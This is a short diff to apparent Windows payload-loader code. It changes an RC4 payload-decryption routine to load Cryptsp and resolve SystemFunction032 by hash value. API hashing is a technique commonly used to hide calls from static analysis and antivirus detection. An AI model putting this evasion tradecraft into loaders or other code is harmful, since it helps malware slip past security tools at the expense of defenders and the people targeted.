@@ -64,7 +64,13 @@ BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 
 	// since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
 	// and using its return as the hModule parameter in GetProcAddress
-	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");
+	//HMODULE hModule = LoadLibraryA("Advapi32");
+	HMODULE hModule = LoadLibraryA("Cryptsp");
+	if (!hModule) {
+		printf("[!] LoadLibraryA For \"hAdvapi32Dll\"  Failed With Error : 0x % 0.8X\n", GetLastError());
+		return FALSE;
+	}
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressByHashValue(hModule, SystemFunction032HashValue);
 
 	// if SystemFunction032 calls failed it will return non zero value
 	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
